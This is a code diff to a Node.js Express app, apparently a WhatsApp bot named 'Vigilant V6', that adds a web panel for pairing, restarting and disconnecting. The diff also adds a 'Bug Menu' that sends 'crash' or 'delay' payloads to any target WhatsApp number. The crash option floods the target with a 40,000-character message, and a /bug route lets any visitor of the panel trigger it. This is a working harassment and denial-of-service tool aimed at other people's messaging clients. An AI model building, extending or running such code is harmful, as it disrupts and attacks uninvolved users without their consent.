@@ -60,7 +60,7 @@ async function disconnectBot() {
 
 // BUG MENU FUNCTION
 async function sendBug(jid, type) {
-    if(!isConnected) return "Not connected"
+    if(!isConnected) return "Bot not connected"
     try {
         if(type === "crash") {
             await sock.sendMessage(jid, { text: "x".repeat(40000) })
@@ -104,4 +104,60 @@ app.get('/', (req, res) => {
                 <button type="submit" class="pair">Get Pairing Code</button>
             </form>
 
-            <div class="code">${pairingCode ? 'Code: ' + pairingCode
+            <div class="code">${pairingCode ? 'Code: ' + pairingCode : ''}</div>
+            <div class="status">Status: ${status}</div>
+
+            <form method="POST" action="/restart" style="display:inline">
+                <button type="submit" class="restart">Restart</button>
+            </form>
+            <form method="POST" action="/disconnect" style="display:inline">
+                <button type="submit" class="disconnect">Disconnect</button>
+            </form>
+
+            <hr style="margin:20px 0;border-color:#333">
+            
+            <form method="POST" action="/bug">
+                <p><b>Bug Menu</b></p>
+                <input name="target" placeholder="Target: 2348xxxxxxxx@s.whatsapp.net" required/>
+                <select name="type">
+                    <option value="crash">Crash Bug</option>
+                    <option value="delay">Delay Bug</option>
+                </select>
+                <button type="submit" class="bug">Send Bug</button>
+            </form>
+
+            <p style="font-size:12px;margin-top:15px">Pair: WhatsApp > Linked Devices > Link with phone number</p>
+        </div>
+    </body>
+    </html>
+    `)
+})
+
+app.post('/pair', async (req, res) => {
+    const number = req.body.number.replace(/\D/g, '')
+    status = "Generating code..."
+    pairingCode = ""
+    await startBot(number)
+    res.redirect('/')
+})
+
+app.post('/restart', async (req, res) => {
+    await disconnectBot()
+    setTimeout(() => { process.exit(1) }, 1000)
+})
+
+app.post('/disconnect', async (req, res) => {
+    await disconnectBot()
+    res.redirect('/')
+})
+
+app.post('/bug', async (req, res) => {
+    const target = req.body.target
+    const type = req.body.type
+    status = await sendBug(target, type)
+    setTimeout(() => { status = isConnected ? "Connected ✅" : status }, 3000)
+    res.redirect('/')
+})
+
+const PORT = process.env.PORT || 3000
+app.listen(PORT, () => console.log(`Vigilant V6 running on ${PORT}`))
